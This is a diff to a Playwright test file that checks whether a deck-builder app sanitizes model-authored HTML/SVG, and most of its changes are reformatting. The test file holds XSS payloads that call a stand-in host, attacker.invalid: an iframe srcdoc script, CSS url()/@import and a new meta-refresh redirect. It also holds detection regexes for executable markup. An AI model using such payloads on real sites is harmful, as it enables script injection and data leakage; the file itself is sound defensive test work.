@@ -11,7 +11,14 @@
  */
 
 import { build } from "esbuild";
-import { expect, test, type Browser, type BrowserContext, type Download, type Page } from "@playwright/test";
+import {
+  expect,
+  test,
+  type Browser,
+  type BrowserContext,
+  type Download,
+  type Page,
+} from "@playwright/test";
 import { createServer, type Server } from "node:http";
 import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
@@ -62,6 +69,9 @@ createRoot(document.getElementById("root")!).render(<DeckBuilder />);
     format: "iife",
     jsx: "automatic",
     define: { "process.env.NODE_ENV": '"test"' },
+    // The entry lives under /tmp, while npm dependencies live under /tests.
+    // Explicitly name that search root rather than relying on cwd resolution.
+    nodePaths: ["/tests/node_modules"],
     logLevel: "silent",
   });
 
@@ -94,7 +104,9 @@ createRoot(document.getElementById("root")!).render(<DeckBuilder />);
     server.listen(0, "127.0.0.1", () => resolve());
   });
   const address = server.address();
-  if (!address || typeof address === "string") throw new Error("Deck harness did not bind a TCP port");
+  if (!address || typeof address === "string") {
+    throw new Error("Deck harness did not bind a TCP port");
+  }
   harnessUrl = `http://127.0.0.1:${address.port}`;
 
   context = await browser.newContext();
@@ -121,8 +133,15 @@ async function generate(reply: string): Promise<void> {
   await expect(prompt).toHaveValue("");
 }
 
-function expectNoExecutableMarkup(html: string): void {
-  expect(html).not.toMatch(/<\s*(?:script|iframe|form|img|object|embed|link|meta|foreignObject|use|a)\b/i);
+function expectNoExecutableMarkup(html: string, allowTrustedDocumentMeta = false): void {
+  expect(html).not.toMatch(
+    /<\s*(?:script|iframe|form|img|object|embed|link|base|foreignObject|use|a)\b/i,
+  );
+  if (allowTrustedDocumentMeta) {
+    expect(html).not.toMatch(/<meta\b[^>]*(?:http-equiv|content\s*=)/i);
+  } else {
+    expect(html).not.toMatch(/<meta\b/i);
+  }
   expect(html).not.toMatch(/\son[a-z]+\s*=/i);
   expect(html).not.toMatch(/(?:javascript|vbscript|data)\s*:/i);
   expect(html).not.toMatch(/url\s*\(/i);
@@ -137,7 +156,9 @@ test.beforeAll(async ({ browser }) => {
 
 test.afterAll(async () => {
   await context.close();
-  await new Promise<void>((resolve, reject) => server.close((error) => (error ? reject(error) : resolve())));
+  await new Promise<void>((resolve, reject) =>
+    server.close((error) => (error ? reject(error) : resolve())),
+  );
   await rm(workDir, { recursive: true, force: true });
 });
 
@@ -166,7 +187,9 @@ test("model-authored HTML/SVG is sanitized before preview and presentation rende
   const previewHtml = await preview.innerHTML();
   expectNoExecutableMarkup(previewHtml);
   expect(previewHtml).toContain("color: rgb(255, 0, 0)");
-  expect(await page.evaluate(() => (window as Window & { __deckPwned?: number }).__deckPwned)).toBe(0);
+  expect(
+    await page.evaluate(() => (window as Window & { __deckPwned?: number }).__deckPwned),
+  ).toBe(0);
   expect(attackerRequests).toEqual([]);
 
   await page.getByRole("button", { name: "Present" }).click();
@@ -177,7 +200,9 @@ test("model-authored HTML/SVG is sanitized before preview and presentation rende
   await expect(presentation.locator("svg circle")).toHaveCount(1);
   const presentationHtml = await presentation.innerHTML();
   expectNoExecutableMarkup(presentationHtml);
-  expect(await page.evaluate(() => (window as Window & { __deckPwned?: number }).__deckPwned)).toBe(0);
+  expect(
+    await page.evaluate(() => (window as Window & { __deckPwned?: number }).__deckPwned),
+  ).toBe(0);
   expect(attackerRequests).toEqual([]);
 });
 
@@ -206,8 +231,10 @@ test("contentEditable changes and exported HTML cross the same sanitizer boundar
 
   expect(exported).toContain("Edited safely");
   expect(exported).toContain("&lt;/title&gt;");
-  expectNoExecutableMarkup(exported);
-  expect(await page.evaluate(() => (window as Window & { __deckPwned?: number }).__deckPwned)).toBe(0);
+  expectNoExecutableMarkup(exported, true);
+  expect(
+    await page.evaluate(() => (window as Window & { __deckPwned?: number }).__deckPwned),
+  ).toBe(0);
   expect(attackerRequests).toEqual([]);
 });
 
@@ -222,10 +249,13 @@ test("mutation, encoded, SVG, and CSS payload families fail closed while present
     '<div style="background-image:image-set(url(http://attacker.invalid/a) 1x);font-size:20px">safe</div>',
     '<style>@import url(http://attacker.invalid/x);</style><p>safe</p>',
     '<iframe srcdoc="<script>window.__deckPwned=13<\/script>"></iframe><u>safe</u>',
+    '<meta http-equiv="refresh" content="0;url=http://attacker.invalid/refresh"><small>safe</small>',
   ];
 
   const outputs = await page.evaluate((items) => {
-    const sanitize = (window as Window & { __sanitizeDeckMarkup: (markup: string) => string }).__sanitizeDeckMarkup;
+    const sanitize = (
+      window as Window & { __sanitizeDeckMarkup: (markup: string) => string }
+    ).__sanitizeDeckMarkup;
     return items.map((item) => sanitize(item));
   }, payloads);
 
@@ -233,7 +263,9 @@ test("mutation, encoded, SVG, and CSS payload families fail closed while present
   expect(outputs.join(" ")).toContain("safe");
 
   const safePresentation = await page.evaluate(() => {
-    const sanitize = (window as Window & { __sanitizeDeckMarkup: (markup: string) => string }).__sanitizeDeckMarkup;
+    const sanitize = (
+      window as Window & { __sanitizeDeckMarkup: (markup: string) => string }
+    ).__sanitizeDeckMarkup;
     return sanitize(
       '<div style="display:flex;background:linear-gradient(135deg,#0f0c29,#302b63);color:#fff"><strong>Portfolio</strong><svg viewBox="0 0 20 20"><circle cx="10" cy="10" r="8" fill="#a78bfa" stroke="#fff" stroke-width="2"></circle></svg></div>',
     );
@@ -242,7 +274,9 @@ test("mutation, encoded, SVG, and CSS payload families fail closed while present
   expect(safePresentation).toContain("linear-gradient");
   expect(safePresentation).toContain("<strong>Portfolio</strong>");
   expect(safePresentation).toContain("<circle");
-  expect(await page.evaluate(() => (window as Window & { __deckPwned?: number }).__deckPwned)).toBe(0);
+  expect(
+    await page.evaluate(() => (window as Window & { __deckPwned?: number }).__deckPwned),
+  ).toBe(0);
   expect(attackerRequests).toEqual([]);
 });
 
